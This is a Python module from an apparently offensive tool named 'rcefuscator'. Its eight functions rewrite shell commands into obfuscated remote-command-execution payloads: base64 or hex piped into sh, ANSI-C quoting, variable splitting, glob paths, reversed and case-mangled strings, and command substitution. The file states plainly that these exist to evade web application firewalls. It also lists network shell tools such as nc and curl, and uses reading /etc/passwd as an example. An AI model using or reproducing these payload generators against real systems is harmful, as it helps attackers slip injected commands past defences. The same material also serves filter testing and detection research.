"""
encoder.py — All encoding/obfuscation functions for rcefuscator.

Each function takes a raw command string and returns an obfuscated payload
string that executes the same command via a different shell mechanism.

Space handling: spaces in commands are replaced with ${IFS} throughout
so multi-word commands like `cat /etc/passwd` work seamlessly.
"""

import base64
from typing import Optional

# ---------------------------------------------------------------------------
# Binary path lookup table for wildcard/glob technique
# ---------------------------------------------------------------------------
BINARY_PATHS = {
    "id":       "/usr/bin/id",
    "whoami":   "/usr/bin/whoami",
    "cat":      "/bin/cat",
    "ls":       "/bin/ls",
    "curl":     "/usr/bin/curl",
    "wget":     "/usr/bin/wget",
    "python3":  "/usr/bin/python3",
    "bash":     "/bin/bash",
    "sh":       "/bin/sh",
    "nc":       "/bin/nc",
    "ncat":     "/usr/bin/ncat",
    "find":     "/usr/bin/find",
    "uname":    "/bin/uname",
    "hostname": "/bin/hostname",
    "env":      "/usr/bin/env",
}


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------

def _replace_spaces(cmd: str) -> str:
    """Replace literal spaces with ${IFS} for WAF evasion."""
    return cmd.replace(" ", "${IFS}")


def _to_hex_chars(cmd: str) -> str:
    """Return the command as a sequence of \\xHH hex escape sequences."""
    return "".join(f"\\x{ord(c):02x}" for c in cmd)


# ---------------------------------------------------------------------------
# Technique 1 — Base64 Encoding
# ---------------------------------------------------------------------------

def base64_encode(cmd: str) -> str:
    """
    Encode the command as base64 and wrap for runtime decoding.

    Output: echo 'aWQ=' | base64 -d | sh
    Uses chars: |
    """
    b64 = base64.b64encode(cmd.encode()).decode()
    return f"echo '{b64}'|base64 -d|sh"


# ---------------------------------------------------------------------------
# Technique 2 — Hex Encoding (printf + xxd pipe)
# ---------------------------------------------------------------------------

def hex_encode(cmd: str) -> str:
    """
    Hex-encode the command and decode via printf/xxd pipeline.

    Output: printf '\\x69\\x64'|xxd -p -r|sh
    Uses chars: |
    """
    hex_seq = _to_hex_chars(cmd)
    return f"printf '{hex_seq}'|xxd -p -r|sh"


# ---------------------------------------------------------------------------
# Technique 3 — ANSI-C Quoting  $'\x..'
# ---------------------------------------------------------------------------

def ansi_c_quote(cmd: str) -> str:
    """
    Convert each character to \\xHH and wrap in bash $'...' syntax.
    Bash expands $'\\x69\\x64' directly — no pipes needed.

    Output: $'\\x69\\x64'
    Uses chars: $, '
    """
    hex_seq = _to_hex_chars(cmd)
    return f"$'{hex_seq}'"


# ---------------------------------------------------------------------------
# Technique 4 — Variable Splitting
# ---------------------------------------------------------------------------

def var_split(cmd: str) -> str:
    """
    Split command into 2-char chunks assigned to unique variables,
    then concatenate via $a$b$c... for execution.

    Output: _a=wh;_b=oa;_c=mi;$_a$_b$_c
    Uses chars: $
    """
    # Split into 2-char chunks
    chunks = [cmd[i:i+2] for i in range(0, len(cmd), 2)]
    # Variable names: _a, _b, _c ...
    var_names = [f"_{chr(ord('a') + i)}" for i in range(len(chunks))]

    assignments = ";".join(f"{name}={chunk}" for name, chunk in zip(var_names, chunks))
    concatenation = "".join(f"${name}" for name in var_names)
    return f"{assignments};{concatenation}"


# ---------------------------------------------------------------------------
# Technique 5 — Wildcard / Glob Expansion
# ---------------------------------------------------------------------------

def wildcard_expand(cmd: str, warn: bool = True) -> Optional[str]:
    """
    Replace directory components in the binary path with ??? glob patterns.

    Output: /???/bin/id  or  /usr/???/id
    Uses chars: none
    Returns None if the binary is not in BINARY_PATHS.
    """
    # Extract the binary name (first word of command)
    binary = cmd.split()[0] if " " in cmd else cmd

    if binary not in BINARY_PATHS:
        return None  # Caller handles the warning

    full_path = BINARY_PATHS[binary]
    parts = full_path.split("/")  # e.g. ['', 'usr', 'bin', 'id']

    # Glob-ify directory components (not the binary name itself)
    globbed = []
    for i, part in enumerate(parts):
        if i == 0:
            globbed.append("")  # leading slash
        elif i == len(parts) - 1:
            # Preserve the binary name — it must match literally
            globbed.append(part)
        else:
            # Replace each directory component with ???-style glob
            globbed.append("?" * len(part))

    glob_path = "/".join(globbed)

    # Append arguments if present
    args = cmd[len(binary):].strip()
    if args:
        return f"{glob_path}${{{_replace_spaces(args)}}}"
    return glob_path


# ---------------------------------------------------------------------------
# Technique 6 — Reverse String
# ---------------------------------------------------------------------------

def reverse_encode(cmd: str) -> str:
    """
    Reverse the command string and decode at runtime via rev.

    Output: echo 'di'|rev|sh
    Uses chars: |
    """
    reversed_cmd = cmd[::-1]
    return f"echo '{reversed_cmd}'|rev|sh"


# ---------------------------------------------------------------------------
# Technique 7 — Case Manipulation
# ---------------------------------------------------------------------------

def case_mangle(cmd: str) -> str:
    """
    Uppercase the command and lowercase it at runtime via tr.

    Output: echo 'ID'|tr 'A-Z' 'a-z'|sh
    Uses chars: |
    """
    upper_cmd = cmd.upper()
    return f"echo '{upper_cmd}'|tr 'A-Z' 'a-z'|sh"


# ---------------------------------------------------------------------------
# Technique 8 — Command Substitution  $(...)
# ---------------------------------------------------------------------------

def cmd_substitution(cmd: str) -> str:
    """
    Wrap a hex-encoded printf call inside $(...) substitution.

    Output: $(printf '\\x69\\x64')
    Uses chars: $, (, )
    """
    hex_seq = _to_hex_chars(cmd)
    return f"$(printf '{hex_seq}')"
